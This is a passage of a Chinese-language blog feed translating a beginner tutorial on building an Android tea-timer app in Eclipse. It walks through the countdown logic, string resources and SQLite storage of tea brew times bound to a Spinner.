<p># /src/com/example/brewclock/BrewClockActivity.java</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">...
public class BrewClockActivity extends Activity
  implements OnClickListener {
  ...
  protected int brewTime = 3;
  protected CountDownTimer brewCountDownTimer;
  protected int brewCount = 0;
  protected boolean isBrewing = false;
  ...
  public void onClick(View v) {
    if(v == brewAddTime)
      setBrewTime(brewTime + 1);
    else if(v == brewDecreaseTime)
      setBrewTime(brewTime -1);
    else if(v == startBrew) {
      if(isBrewing)
        stopBrew();
      else
        startBrew();
    }
  }
}
</pre>
<p>注意我们使用了Android提供的类CountDownTimer 。这让我们非常容易的创建和开始一个简单的递减计数，这个递减计数在递减运行的时候，每当执行一个递减就发出一个通知。你将在下面的startBrew 方法中使用到这个计数器。</p>
<p>在下面的方法是所有处理逻辑，这些处理逻辑用于处理设置泡茶时间，开始停止计数和维护计数器。我们同样地在onCreate方法中来初始化我们的 brewTime和 brewCount变量。</p>
<p>将这些代码放入到不同的类中是一种好做法。但是为了简洁，我把我们所有的代码都放到了BrewClockActivity中：</p>
<p># /src/com/example/brewclock/BrewClockActivity.java</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">...
public class BrewClockActivity extends Activity
  implements OnClickListener {
  ...
  public void onCreate(Bundle savedInstanceState) {
    ...
    // Set the initial brew values
    setBrewCount(0);
    setBrewTime(3);
  }

  /**
   * Set an absolute value for the number of minutes to brew.
   * Has no effect if a brew is currently running.
   * @param minutes The number of minutes to brew.
   */
  public void setBrewTime(int minutes) {
    if(isBrewing)
      return;

    brewTime = minutes;

    if(brewTime &lt; 1)
      brewTime = 1;

    brewTimeLabel.setText(String.valueOf(brewTime) + "m");
  }

  /**
   * Set the number of brews that have been made, and update
   * the interface.
   * @param count The new number of brews
   */
  public void setBrewCount(int count) {
    brewCount = count;
    brewCountLabel.setText(String.valueOf(brewCount));
  }

  /**
   * Start the brew timer
   */
  public void startBrew() {
    // Create a new CountDownTimer to track the brew time
    brewCountDownTimer = new CountDownTimer(brewTime * 60 * 1000, 1000) {
      @Override
      public void onTick(long millisUntilFinished) {
        brewTimeLabel.setText(String.valueOf(millisUntilFinished / 1000) + "s");
      }

      @Override
      public void onFinish() {
        isBrewing = false;
        setBrewCount(brewCount + 1);

        brewTimeLabel.setText("Brew Up!");
        startBrew.setText("Start");
      }
    };

    brewCountDownTimer.start();
    startBrew.setText("Stop");
    isBrewing = true;
  }

  /**
   * Stop the brew timer
   */
  public void stopBrew() {
    if(brewCountDownTimer != null)
      brewCountDownTimer.cancel();

    isBrewing = false;
    startBrew.setText("Start");
  }
  ...
}
</pre>
<p>这段代码唯一和Android相关的就是使用setText方法来设置文本的显示文字。在startBrew方法中，我们创建，并开始了一个CountDownTimer来开每秒递减计数直到计数器为0。注意，我们定义了CountDownTimer以内联方式监听onTick 和 onFinish方法。 onTick 方法将每1000毫秒（1秒）执行一次，并递减, 当计数器为0的时候，onFinish方法被调用。</p>
<h4>
<span class="ez-toc-section" id="%E9%81%BF%E5%85%8D%E5%9C%A8%E4%BD%A0%E7%9A%84%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%A1%AC%E7%BC%96%E7%A0%81"></span>避免在你的代码中硬编码<span class="ez-toc-section-end"></span>
</h4>
<p>为了使教程代码简单，我故意地在程序中将控件的标号直接写到字串中（例如： “Brew Up!”, “Start”, “Stop”） 通常，这不是一个好的做法，因为如果在大型项目中，这样做会使得修改变得麻烦。</p>
<p>Android 提供了一种简洁的方法让你使用R对象来使字符串和代码分离。R 让你在xml文件（res/values/strings.xml）定义所有你程序中字符串，并让你可以在代码中应用到这些字符串。例如：</p>
<p># /res/values/strings.xml</p>
<p>[code]<br>
&lt;string name="brew_up_label"&gt;Brew Up!&lt;/string&gt;<br>
…<br>
[/code]</p>
<p># /res/com/example/brewclock/BrewClockActivity.java</p>
<p>[code]<br>
…<br>
brewLabel.setText(R.string.brew_up_label);<br>
…<br>
[/code]</p>
<p>现在，如果你想改变Brew Up! 字样，你只要一次性的修改strings.xml文件就行了。你的应用将生成一堆代码来保证你程序中所有使用到这些字符串的地方都能被生效！</p>
<h4>
<span class="ez-toc-section" id="%E8%BF%90%E8%A1%8CBrew_Clock"></span>运行Brew Clock<span class="ez-toc-section-end"></span>
</h4>
<p>代码完成之后，现在是试运行程序的时候了。单击<em>Run</em> 或 <em>Ctrl+F11</em> 在模拟器中启动我们的应用. 所有都运行良好，你将会看到你创建的用户界面在准备时间一到就可以喝你所泡的茶了！试着设置不同的时间，并点击<em>Start</em> 观看倒计时。</p>
<p><img alt="image placeholder" ></p>
<h3>总结</h3>
<p>在这个关于Android的简单介绍中，你已学会如何安装Android SDK和Eclipse的Android 开发工具插件（ADT）。你也学会如何创建一个模拟设备，并通过这个设备来测试你的应用程序。你还学会了如何开发Android应用程序。上面了那些作为标题的关键概念在以后你自己开发Android应用程序的时候将会经常用到。</p>
<p>我们希望，这个教程能激发你的开发移动应用程序的欲望，并步入这个令人激动的领域。Android为当前和即将到来的移动设备应用程序开发提供了一条宽广的道路。如果你已经开发你自己的移动应用，请在评论中告诉我们。</p>
<p><em>(ik), (vf)</em></p>
<p><em>（全文完）</em></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/4334.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4334.html" class="wp_rp_title">Eclipse开发Android应用程序入门:重装上阵</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17066.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17066.html" class="wp_rp_title">关于移动端的钓鱼式攻击</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12225.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12225.html" class="wp_rp_title">DHH 谈混合移动应用开发</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12136.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12136.html" class="wp_rp_title">Google Inbox如何跨平台重用代码？</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4220.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4220.html" class="wp_rp_title">一些有意思的文章和资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3589.html" class="wp_rp_title">食客还是大厨</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4270" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="a9b31a9a22">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>17</strong> 人打了分，平均分： <strong>3.59</strong> )<br><span class="post-ratings-text" id="ratings_4270_text"></span><meta itemprop="name" content="Eclipse开发Android应用程序入门">
<meta itemprop="headline" content="Eclipse开发Android应用程序入门">
<meta itemprop="description" content="By Chris Blunt

翻译：赵锟
原文出处：http://www.smashingmagazine.com/2010/10/25/get-started-developing-for-android-with-eclipse/

如今的移动设备应用程序开发充满着让人振奋的东西。功能强大的硬件支持，平板电脑，多样的软件平台（塞班 OS，iOS，WebOS，Windows Phon...">
<meta itemprop="datePublished" content="2011-04-07T16:40:36+08:00">
<meta itemprop="dateModified" content="2011-04-07T22:01:46+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4270.html">
<meta itemprop="author" content="Neo">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4270.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.59">
<meta itemprop="ratingCount" content="17">
</div>
</div>
<div id="post-ratings-4270-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-07T16:40:36+08:00</pubDate>
<guid>https://coolshell.cn/articles/4270.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Eclipse开发Android应用程序入门:重装上阵 ]]></title>
<link>https://coolshell.cn/articles/4334.html</link>
<content><![CDATA[ 
<p><strong>翻译:赵锟</strong><br>
原文：<a href="http://www.smashingmagazine.com/2011/03/28/get-started-developing-for-android-with-eclipse-reloaded/">http://www.smashingmagazine.com/2011/03/28/get-started-developing-for-android-with-eclipse-reloaded/</a></p>
<p>在我们教程系列的<a href="https://coolshell.cn/articles/4270.html">第一部分</a>中，我们使用Android和Eclipse开发了一个简单的饮茶计时器的应用程序。在第二部分，我们将继续开发这个程序，并给它增加一些其他的额外的功能。在开发的过程中，我们将给你介绍更多重要而强大的Android SDK特性，包括持久化数据存储，Activity和Intent，和共享用户首选项（译者注：类似于windows 的注册表的一种机制）。</p>
<p>跟着本教程，你需要上一篇教程中的代码，如果你想直接使用代码，你可以使用如下的指令从<a href="https://github.com/cblunt/BrewClock">GitHub</a>上check out出tutorial_par_1标记的代码：</p>
<p><img alt="image placeholder" ><br>
[code]<br>
$ git clone git://github.com/cblunt/BrewClock.git<br>
$ cd BrewClock<br>
$ git checkout tutorial_part_1<br>
[/code]</p>
<p>在GitHub中检出了代码后，你需要将代码倒入到Eclipse中的项目中：</p>
<ol>
<li>运行 Eclipse 选择 <em>File → Import…</em>
</li>
<li>在导入窗口, 选择 <em>“Existing Projects into Workspace”</em>并点击<em> “Next.”</em>
</li>
<li>在下一屏，点击 <em>“Browse,”</em>选择你从GitHub上clone出的代码目录。</li>
<li>点击“Finish” 将项目导入到Eclipse中。</li>
</ol>
<p><span id="more-4334"></span><br>
在导入项目到Eclipse之后，你有可能会看到有如下的警告信息：<br>
[code]<br>
Android required .class compatibility set to 5.0.<br>
Please fix project properties.<br>
[/code]<br>
如果有这种情况，右键点击“Project Explorer ”中新导入的BrewClock项目，并选择 “Fix Project Properties,” 并重启Eclipse。</p>
<h3>数据持久化入门</h3>
<p>当前,BrewClock 让用户为他们泡的茶设置一个定时器。这个非常棒的一个工作，但是如果对于不同的茶使用同一个泡茶时间的结果会怎样呢，是不每种茶都应该有自己的一个泡茶时间呢？如果这样，那岂不是所有的用户都需要记下每一类茶所需要泡的时间！这不是一个很好的用户体验。因此，在这篇教程中，我将新增一个功能来为用户每种不同的茶叶存放一个泡茶时间，并当用户想泡茶的时候，可以从茶叶列表中进行选择。</p>
<p>为了实现这个目的，我们得利用Android的丰富的数据持久化的API。Android提供了几种方式来存储数据，本文将要覆盖其中的两种方式。第一种，使用SQLite数据库引擎来为我们存储数据。</p>
<p>SQLite 是一种流行的轻量级SQL数据库引擎，它将数据存在单个文件中。SQLite经常用于桌面或在那些运行不能运行客户端-服务器SQL引擎（例如MySQL或PostgreSQL)的嵌入式的应用上。</p>
<p>每个安装在Android上的应用都可以保存和使用多个SQLite数据库文件（由数据存储容量决定），这些数据由系统自动地进行管理。应用程序的数据是私有并且不能被其他的应用程序所访问。（数据可以通过ContentProvider(译者注：内容提供者类)类进行共享，但是我们不会在本教程中覆盖关于内容提供者的内容）。当数据应用程序被更新时，数据库文件就进行持久化，当应用程序被删除时，数据库文家就被删除。</p>
<p>我们在BrewClock应用使用SQLite数据来维护我们的茶叶列表和泡茶所需要的时间。下面是我们我们将使用的数据表的一个总体介绍。</p>
<p>[code]<br>
+————————————-+<br>
| Table: teas |<br>
+————+————————+<br>
| Column | Description |<br>
+————+————————+<br>
| _ID | integer, autoincrement |<br>
| name | text, not null |<br>
| brew_time | integer, not null |<br>
+————+————————+<br>
[/code]</p>
<p>如果以前你使用过SQL，你应该熟悉这些内容。数据表有三个字段，一个唯一标示（_ID），茶叶名称(name)和泡茶时间(brew_time)字段。我们将使用Android提供给我们的API在应用中建立数据表。系统将负责在正确的位置为我们的创建数据库文件。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E5%BA%93" title="抽象数据库">抽象数据库</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE" title="查询数据">查询数据</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E4%BF%AE%E6%94%B9BrewClock%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%85%81%E8%AE%B8%E8%BF%9B%E8%A1%8C%E8%8C%B6%E5%8F%B6%E9%80%89%E6%8B%A9" title="修改BrewClock用户界面，允许进行茶叶选择">修改BrewClock用户界面，允许进行茶叶选择</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A" title="数据绑定">数据绑定</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E8%AF%BB%E5%8F%96%E9%80%89%E4%B8%AD%E8%8C%B6%E5%8F%B6%E6%95%B0%E6%8D%AE%E5%B9%B6%E6%9B%B4%E6%96%B0%E6%B3%A1%E8%8C%B6%E6%97%B6%E9%97%B4" title="读取选中茶叶数据并更新泡茶时间">读取选中茶叶数据并更新泡茶时间</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E9%80%89%E9%A1%B9%E8%8F%9C%E5%8D%95" title="选项菜单">选项菜单</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E5%A4%84%E7%90%86%E8%8F%9C%E5%8D%95%E7%82%B9%E5%87%BB" title="处理菜单点击">处理菜单点击</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E4%BF%9D%E5%AD%98%E6%96%B0%E5%A2%9E%E8%8C%B6%E5%8F%B6" title="保存新增茶叶">保存新增茶叶</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#%E6%94%B9%E8%BF%9B%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C" title="改进用户体验">改进用户体验</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#Activities" title="Activities">Activities</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E5%BA%93"></span>抽象数据库<span class="ez-toc-section-end"></span>
</h4>
<p>为了确保数据库的代码容易被维护，我们用一个单独的类TeaData来抽象所有处理数据库创建，插入，和查询的代码。如果你熟悉模型-试图-控制(译者注：MVC)方法的话，这个你也应该熟悉。所有数据库代码与我们的BrewClockActitvity类隔离开来。Actitvity可以初始化一个新的TeaData实例（这个实例将连接数据库）并完成它所需要的工作。以这种方式工作保证了我们可以方便的更改我们所使用的数据库而不用修改其他那些和数据库不相关部分的代码。</p>
<p>通过菜单File → New → Class.在BrewClock项目中创建一个TeaData的新类。确保TeaData扩展于android.database.sqlite.SQLiteOpenHelper 类，并选中“Constructors from superclass”复选框。<br>
<img alt="image placeholder" ></p>
<p>TeaData 类将为你自动地处理SQLite数据库的创建和版本。我们需要增加一些方法来作为其他代码到数据库的接口。</p>
<p>增加两个常量来存储数据库的名字和版本,增加表名和表中列名。我们使用Android提供的常类BaseColumns._ID来做为表的唯一id列：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/TeaData.java
import android.app.Activity;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.DatabaseUtils;
import android.provider.BaseColumns;

public class TeaData extends SQLiteOpenHelper {
  private static final String DATABASE_NAME = "teas.db";
  private static final int DATABASE_VERSION = 1;

  public static final String TABLE_NAME = "teas";

  public static final String _ID = BaseColumns._ID;
  public static final String NAME = "name";
  public static final String BREW_TIME = "brew_time";

  // …
}
</pre>
<br>
为TeaData增加一个构造方法，以数据库名称合版本号为参数调用其父类的构造方法。Android将会自动地打开数据库（如果数据库不存在就自动创建它）。<br>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/TeaData.java
public TeaData(Context context) {
  super(context, DATABASE_NAME, null, DATABASE_VERSION);
}
</pre>
<p>我们需要重载onCreate方法，并执行一个SQL 串执行创建数据库表的操作。Android将会在数据库文件第一次被创建时调用这个方法。</p>
<p>在启动过程中，Android检查数据库的版本是否我们传入的版本一致。如果版本发生了改变，Android将会调用onUpgrade方法，在这个方法总，你可以编写修改数据库结构的业务逻辑。在本教程中，我们将让Android删除数据库并重建数据库。</p>
<p>在onCreate和onUpgrade中增加如下的代码:<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/TeaData.java
@Override
public void onCreate(SQLiteDatabase db) {
  // CREATE TABLE teas (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, brew_time INTEGER);
  String sql =
    "CREATE TABLE " + TABLE_NAME + " ("
      + _ID + " INTEGER PRIMARY KEY AUTOINCREMENT, "
      + NAME + " TEXT NOT NULL, "
      + BREW_TIME + " INTEGER"
      + ");";

  db.execSQL(sql);
}

@Override
public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
  db.execSQL("DROP TABLE IF EXISTS " + TABLE_NAME);
  onCreate(db);
}

</pre>
<br>
下一步，我们需要新增代码让我们方便地在数据库中新增茶叶记录。我们新增一个带茶叶名称和泡茶时间的方法来负责插入记录。Android为了尽量避免开发者使用SQL语句，提供了一堆类来处理向数据库中查入记录。首先，我们创建一个ContentValues集合，并将相关的值插入到这个集合中去。
<p>对于ContentValues集合，我们只要简单地提供一个列名和值来插入就行了。Android负责创建和运行正确的SQL。使用Android的数据类确保了你能写出安全，跨平台的数据库操作代码。</p>
<p>Add a new method, insert(), to the TeaData class:<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/TeaData.java
public void insert(String name, int brewTime) {
  SQLiteDatabase db = getWritableDatabase();

  ContentValues values = new ContentValues();
  values.put(NAME, name);
  values.put(BREW_TIME, brewTime);

  db.insertOrThrow(TABLE_NAME, null, values);
}

</pre>
<h4>
<span class="ez-toc-section" id="%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"></span>查询数据<span class="ez-toc-section-end"></span>
</h4>
<p>我们应用程序具有了在数据库中保存数据的能力后，我们同样也需要一种方式将数据取回来。Android提供了游标Cursor接口来完成这件工作。一个游标代表了针对数据库运行一个SQL返回的结果集，游标在这个结果集中维护了一个指针来指向结果集中的一行。这个指针可以向前，向后移动，并返回每一列的值，下面我们用图形来帮助你理解游标:</p>
<p>SQL 查询: SELECT * from teas LIMIT 3;<br>
[code]<br>
+———————————–+</p>
<p>| _ID | name | brew_time |</p>
<p>+———————————–+</p>
<p>| 1 | Earl Grey | 3 |</p>
<p>| 2 | Green | 1 | &lt;= Cursor</p>
<p>| 3 | Assam | 5 |</p>
<p>+——-+————-+————-+<br>
[/code]</p>
<p>在这个例子中，游标指向了结果集中的第二条记录（绿茶）。我们可以通过调用cursor.moveToPrevious()方法，将游标向前移动，让它指向第一行（Earl Grey），或者调用moveToNext向前移动指向Assam。要取到游标所指向记录的茶叶的名称，我们只要调用cursor.getString(1)，1代表我们向提取数据列的下标（注意下标识从0开始的，1代表第二列，依次类推）。</p>
<p>在了解游标后，我们增加一个创建游标对象并返回数据库中所有的茶叶信息。在TeaData中增加all方法：<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/TeaData.java
public Cursor all(Activity activity) {
  String[] from = { _ID, NAME, BREW_TIME };
  String order = NAME;

  SQLiteDatabase db = getReadableDatabase();
  Cursor cursor = db.query(TABLE_NAME, from, null, null, null, null, order);
  activity.startManagingCursor(cursor);

  return cursor;
}
</pre>
<br>
因为这个方法乍一看有点古怪，所以让我们先来关心一下这个方法的一些细节。我们没有使用SQL的查询语句，而是使用了Android提供的数据库接口方法。
<p>第一，我们需要告诉Android，我们所关心的列的信息。我们创建了一个字符串数组，数组中存放这TeaData中列的标示信息。我们还设置了我名们期望的结果集按照哪一个列进行排序的列名。</p>
<p>第二，我们使用getReadalbeDatabase()创建了一个到数据库的只读连接，并调用query方法告诉Android我们希望用query方法运行一个查询。query()方法有很多的参数，Android在内部将这些参数转化为一个查询语句。此外，Android的抽象层保证了即使底层数据储存机制发生了变化，我们的应用程序代码也能正确的工作。</p>
<p>由于我们只要返回表中的所有记录，所以我们没有在方法中使用到链接join，过滤filter和分组group（例如：在SQL中的WHERE，JOIN，和GROUP BY）。from和order变量告诉查询数据库需要返回那些列和提取数据时按什么列进行排序。我们使用SQLiteDatabase.query()作为和数据库的人机交互接口。</p>
<p>最后，我们让Activity（在本例中，我们的BrewClockActivity）来管理游标。通常，游标需要人工刷新内容，因此当我们增加一个新茶信息到数据库中时，我们就需要刷新我们的游标。每当我们的应用被挂起和恢复的时候，通过调用startManagingCursor()让Android来帮我们重建结果集。</p>
<p>在TeaData类中增加count方法:<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/TeaData.java
  public long count() {
    SQLiteDatabase db = getReadableDatabase();
    return DatabaseUtils.queryNumEntries(db, TABLE_NAME);
  }

</pre>
<br>
保存TeaData类，使用修正没有import 的类(Source → Organize Imports)，在完成我们的数据类后，下一步我们将着手修改我们BrewClock的人机界面。
<h4>
<span class="ez-toc-section" id="%E4%BF%AE%E6%94%B9BrewClock%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%85%81%E8%AE%B8%E8%BF%9B%E8%A1%8C%E8%8C%B6%E5%8F%B6%E9%80%89%E6%8B%A9"></span>修改BrewClock用户界面，允许进行茶叶选择<span class="ez-toc-section-end"></span>
</h4>
<p>持久化茶和泡茶的时间的目的是让用能快速的选择他们所钟爱的预设置的茶。为了完成这个功能，我们需要再BrewClock的主界面上增加一个Spinner（类似于桌面上弹出菜单），生成一个来自于TeaData的茶列表。</p>
<p>和前面的教程一样，我们使用了Eclipse的布局器编辑器在BrewClock的主界面布局XML文件中增加Spinner。在LinearLayout元素下面增加下面这些代码（大约在24行）。如果你打开了可视化的布局编辑器后，你可以点击窗口下面的地”Code View”进行切换。<br>
</p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">&lt;!-- /res/layout/main.xml --&gt;

&lt;!-- Tea Selection --&gt;
&lt;LinearLayout
  android:orientation="vertical"
  android:layout_width="fill_parent"
  android:layout_height="wrap_content"&gt;

  &lt;Spinner
    android:id="@+id/tea_spinner"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content" /&gt;

&lt;/LinearLayout&gt;
</pre>
<p>在BrewClockActivity类里面,增加一个成员变量指向Spinner，通过使用findViewById连接界面上的控件：<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/BrewClockActivity.java
protected Spinner teaSpinner;
protected TeaData teaData;

// …

public void onCreate(Bundle savedInstanceState) {
  // …
  teaData = new TeaData(this);
  teaSpinner = (Spinner) findViewById(R.id.tea_spinner);
}
</pre>
<p>运行你的程序以确保新的界面正确地生效。你应该在泡茶计数器下看见一个空白的弹出式菜单（或者是Spinner)。如果点击spinner，Android将显示一个弹出式的菜单并为你提供选择列表。在这时，菜单的内容因该是空的，现在让我们来绑定Spinner和我们的茶叶数据库。</p>
<p><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A"></span>数据绑定<span class="ez-toc-section-end"></span>
</h4>
<p>当Android从数据库中查询数据时，它将会返回一个游标Cursor对象。Cursor代表了来自数据库的结果集，并可以移动游标来提取结果中的数据。使用一类Android提供的称为“适配器Adapter”的类，我们很容易将这个结果集绑定到Spinner上。适配器完成了提取数据库结果集中的数据并在界面上显示这些数据等这些复杂而困难工作。</p>
<p>在我们的TeaData.all()方法中已经可以返回一个带有tea表内容的游标，使用这个游标，我们所需要做的工作就是创建一个SimpleCursor适配器来绑定我们的teaSpinner，Android会负责处理将数据显示在spinner的列表中。</p>
<p>通过创建一个SimpleCursorAdapter类来连接Spinner与teaData.all()返回的游标：<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// com/example/brewclock/BrewClockActivity.java

public void onCreate(Bundle savedInstanceState) {
  // …
  Cursor cursor = teaData.all(this);

  SimpleCursorAdapter teaCursorAdapter = new SimpleCursorAdapter(
    this,
    android.R.layout.simple_spinner_item,
    cursor,
    new String[] { TeaData.NAME },
    new int[] { android.R.id.text1 }
  );

  teaSpinner.setAdapter(teaCursorAdapter);
  teaCursorAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
}

</pre>
<br>
注意，我们使用了Android内建的android.R对象。这个对象提供了你的应用程序中的默认资源，例如视图和布局。在我们的代码中，我们使用了android.R.layout.simple_spinner_item，它是简单的文本标签布局。
<p>如果你再次运行的应用程序，你将会看到spinner中仍然是空的！虽然我们已经连接了我们的数据库，但是由于数据库中没有任何记录，所以我们任何看到了空列表。</p>
<p>我们通过在构造方法中增加一些默认记录来让用户可以选择所需要的茶叶，为了避免重复记录，我们只有在数据库中记录为0的情况才增加默认记录。在本教程的代码中，我们使用前面增加的count()来检查数据库中表记录是否为空。</p>
<p>增加当数据库中表为空的默认记录代码。把这些代码增加从数据库提取茶叶数据的前面（译者注：上一段的代码前）。<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// com/example/brewclock/BrewClockActivity.java
public void onCreate(Bundle savedInstanceState) {
  // …

  // Add some default tea data! (Adjust to your preference :)
  if(teaData.count() == 0) {
    teaData.insert("Earl Grey", 3);
    teaData.insert("Assam", 3);
    teaData.insert("Jasmine Green", 1);
    teaData.insert("Darjeeling", 2);
  }

  // Code from the previous step:
  Cursor cursor = teaData.all(this);

  // …
}

</pre>
<br>
现在再次运行你的应用程序。你将会发现茶叶Spinner有了一条选择。点击Spinner让你可以从数据库选择你要的茶叶。
<p><img alt="image placeholder" ></p>
<p>恭喜你！你已经成功关联了你的界面和代码。这是任何软件开发过程中一个非常重要的方面。正如你所看见的，Android将这一步简化的非常容易，但是功能有是非常的NB。使用游标和适配器，你可以将数据源（丛简单的字符串数组到复杂的数据库查询）绑定到任何类型的视图：spinner或列表，设置是类似iTunes cover-flow gallery!</p>
<p>虽然现在已经可以开始泡茶了，但是我们工作还远没有结束。当你从Spinner选择了不同的茶，这个选择却不会发生任何作用。我们需要根据用户所选茶叶的种类取更新我们的泡茶时间。</p>
<h4>
<span class="ez-toc-section" id="%E8%AF%BB%E5%8F%96%E9%80%89%E4%B8%AD%E8%8C%B6%E5%8F%B6%E6%95%B0%E6%8D%AE%E5%B9%B6%E6%9B%B4%E6%96%B0%E6%B3%A1%E8%8C%B6%E6%97%B6%E9%97%B4"></span>读取选中茶叶数据并更新泡茶时间<span class="ez-toc-section-end"></span>
</h4>
<p>为了能读取用户从数据库中选择茶叶的数据，我们必须增加一个针对此事件的监听器。类似于处理按钮点击事件的OnClickListener监听器一样，我们将实现一个OnItemSelectedListener。当用户从视图中做出一个选择的事件将触发这个监听器，例如从我们的Spinner。</p>
<p>在BrewClockActivity中增加需要实现的接口OnItemSelectedListener。并增加其响应的处理方法onItemSelected()和onNothingSelected()：<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">// src/com/example/brewclock/BrewClockActivity.java
public class BrewClockActivity extends Activity implements OnClickListener, OnItemSelectedListener {
  // …
  public void onItemSelected(AdapterView&lt;?&gt; spinner, View view, int position, long id) {
    if(spinner == teaSpinner) {
      // Update the brew time with the selected tea’s brewtime
      Cursor cursor = (Cursor) spinner.getSelectedItem();
      setBrewTime(cursor.getInt(2));
    }
  }

  public void onNothingSelected(AdapterView&lt;?&gt; adapterView) {
    // Do nothing
  }
}

</pre>
<br>
在这里我们要检查是触发的spinner此事件是不是BrewClock的teaSpinner。如果是，我们将提取代表选中记录的游标对象。这些都是由关联teaData和Spinner的SimpleCursorAdapter来提供我们完成的。Android知道哪个查询产生的Spinner数据，也知道用户选择的哪个数据。Android使用游标来返回数据库的一行记录，也代表了用户所选择的茶叶数据。
